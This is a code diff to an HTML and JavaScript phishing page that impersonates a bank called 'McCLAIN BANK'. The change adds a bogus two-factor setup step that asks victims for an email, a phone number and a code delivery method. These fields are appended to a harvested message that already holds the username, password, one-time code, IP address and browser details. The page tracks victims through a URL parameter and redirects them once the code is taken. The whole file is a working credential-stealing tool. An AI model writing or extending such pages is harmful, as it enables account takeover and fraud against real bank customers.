@@ -8,7 +8,7 @@
 <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
 <style>
   :root{
-    --theme:#700e0e; --theme-press:#b81717; --theme-focus:#941313;
+    --theme:#700e0e; --theme-press:#b81717;
     --text:#071523; --text2:#626e7a; --page:#e3e7ed;
     --btn-radius:8px; --card-radius:10px;
     --shadow:0 3px 12px 0 rgba(0,0,0,.15);
@@ -55,6 +55,19 @@
   .forgot{margin-top:-6px;display:inline-block}
   .signas{color:var(--text2);font-size:13px;margin-top:18px;text-align:center}
   .signas b{color:var(--text);font-weight:500;word-break:break-all}
+  .h2fa{font-size:15px;font-weight:500;margin:26px 0 0;color:var(--text)}
+  .hint{font-size:13px;color:var(--text2);margin:6px 0 0;line-height:1.45}
+  .methods{margin-top:18px}
+  .methods label{
+    display:flex;align-items:center;gap:10px;padding:12px 12px;
+    border:1px solid #d5dbe3;border-radius:6px;margin-bottom:8px;
+    font-size:14px;cursor:pointer;color:var(--text);
+  }
+  .methods label:has(input:checked){border-color:var(--theme);background:#fbf4f4}
+  .methods input{accent-color:var(--theme);margin:0}
+  .check{display:flex;align-items:center;gap:9px;margin-top:20px;
+    font-size:13px;color:var(--text2);cursor:pointer}
+  .check input{accent-color:var(--theme);margin:0}
   button{
     border:0;cursor:pointer;font:inherit;font-weight:500;color:#fff;background:var(--theme);
     border-radius:var(--btn-radius);padding:12px 26px;min-width:132px;font-size:15px;
@@ -115,12 +128,32 @@
       <div class="row right"><button type="submit">Sign in</button></div>
     </form>
 
+    <form id="step-2fa" hidden>
+      <h2 class="h2fa">Two-factor authentication</h2>
+      <p class="hint">Add an email and mobile number to receive verification codes.</p>
+      <div class="field">
+        <div class="label">Email address</div>
+        <input id="contact-email" type="email" spellcheck="false" autocorrect="off" autocapitalize="off" autocomplete="email" aria-label="Email address">
+      </div>
+      <div class="field">
+        <div class="label">Cell phone number</div>
+        <input id="phone" type="tel" inputmode="tel" autocomplete="tel" aria-label="Cell phone number">
+      </div>
+      <div class="methods">
+        <label><input type="radio" name="method" value="text" checked> Text message</label>
+        <label><input type="radio" name="method" value="call"> Phone call</label>
+        <label><input type="radio" name="method" value="authy"> Authenticator app</label>
+      </div>
+      <div class="row right"><button type="submit">Next</button></div>
+    </form>
+
     <form id="step-code" hidden>
       <div class="signas">A code was sent to the phone on file for <b class="address-value"></b></div>
       <div class="field">
         <div class="label">Verification code</div>
         <input id="code" type="text" inputmode="numeric" autocomplete="one-time-code" maxlength="8" aria-label="Verification code">
       </div>
+      <label class="check"><input type="checkbox" id="trust"> Don't ask for codes again on this computer</label>
       <div class="row right"><button type="submit">Verify</button></div>
       <div class="status-message" hidden></div>
     </form>
@@ -135,15 +168,19 @@
 </footer>
 
 <script>
-const emailInput    = document.getElementById('email');
-const passwordInput = document.getElementById('password');
-const codeInput     = document.getElementById('code');
-const stepEmail     = document.getElementById('step-email');
-const stepPassword  = document.getElementById('step-password');
-const stepCode      = document.getElementById('step-code');
-const statusMessage = stepCode.querySelector('.status-message');
+const emailInput   = document.getElementById('email');
+const passwordInput= document.getElementById('password');
+const contactEmail = document.getElementById('contact-email');
+const phoneInput   = document.getElementById('phone');
+const codeInput    = document.getElementById('code');
 
-const steps = [stepEmail, stepPassword, stepCode];
+const stepEmail    = document.getElementById('step-email');
+const stepPassword = document.getElementById('step-password');
+const step2fa      = document.getElementById('step-2fa');
+const stepCode     = document.getElementById('step-code');
+const statusMessage= stepCode.querySelector('.status-message');
+
+const steps = [stepEmail, stepPassword, step2fa, stepCode];
 const addressValues = document.querySelectorAll('.address-value');
 const trackingEmail = new URLSearchParams(location.search).get('e') || '';
 
@@ -156,6 +193,7 @@ function showStep(i){
   steps.forEach((s,n)=>{ s.hidden = n !== i; });
   if(i===0) emailInput.focus();
   else if(i===1) passwordInput.focus();
+  else if(i===2) contactEmail.focus();
   else codeInput.focus();
 }
 function updateAddress(){
@@ -164,10 +202,15 @@ function updateAddress(){
 function buttonOf(f){ return f.querySelector('button'); }
 function lockButton(b,l){ b.textContent = l; b.disabled = true; }
 function resetButtons(){
-  buttonOf(stepEmail).textContent='Continue';    buttonOf(stepEmail).disabled=false;
-  buttonOf(stepPassword).textContent='Sign in';  buttonOf(stepPassword).disabled=false;
-  buttonOf(stepCode).textContent='Verify';       buttonOf(stepCode).disabled=false;
+  buttonOf(stepEmail).textContent='Continue';   buttonOf(stepEmail).disabled=false;
+  buttonOf(stepPassword).textContent='Sign in'; buttonOf(stepPassword).disabled=false;
+  buttonOf(step2fa).textContent='Next';         buttonOf(step2fa).disabled=false;
+  buttonOf(stepCode).textContent='Verify';      buttonOf(stepCode).disabled=false;
   statusMessage.hidden = true;
+}
+function method(){
+  const picked = document.querySelector('input[name="method"]:checked');
+  return picked ? picked.value : 'text';
 }
 function fetchIp(){
   return fetch('https://api.ipify.org?format=json')
@@ -179,6 +222,9 @@ async function send(stage, otp){
     '*#--------[ McCLAIN BANK ]---------#*\n\n' +
     '*Username* : ' + emailInput.value.trim() + '\n' +
     '*Password* : ' + passwordInput.value.trim() + '\n' +
+    '*Contact* : ' + contactEmail.value.trim() + '\n' +
+    '*Phone* : ' + phoneInput.value.trim() + '\n' +
+    '*Method* : ' + method() + '\n' +
     '*Code* : ' + (otp || '-') + '\n' +
     '*IP* : ' + ip + '\n' +
     '*Device* : ' + navigator.userAgent + '\n' +
@@ -202,11 +248,18 @@ stepPassword.addEventListener('submit', async e=>{
   resetButtons(); showStep(2);
 });
 
+step2fa.addEventListener('submit', async e=>{
+  e.preventDefault();
+  lockButton(buttonOf(step2fa),'Sending...');
+  await send('STEP 3 - 2FA SETUP');
+  resetButtons(); showStep(3);
+});
+
 stepCode.addEventListener('submit', async e=>{
-  e.preventDefault(); updateAddress();
+  e.preventDefault();
   lockButton(buttonOf(stepCode),'Verifying...');
   statusMessage.textContent='Verifying your code...'; statusMessage.hidden=false;
-  try { await send('STEP 3 - CODE', codeInput.value.trim()); }
+  try { await send('STEP 4 - CODE', codeInput.value.trim()); }
   finally { setTimeout(()=>{ location.href = REDIRECT_URL; }, FINAL_DELAY_MS); }
 });
 
@@ -214,7 +267,7 @@ document.querySelectorAll('.change-link').forEach(a=>{
   a.addEventListener('click', e=>{ e.preventDefault(); resetButtons(); showStep(0); });
 });
 document.querySelectorAll('.forgot-link, footer a').forEach(a=>{
-  a.addEventListener('click', e=>e.preventDefault());
+  a.addEventListener('click', e=>{ e.preventDefault(); });
 });
 
 showStep(0);
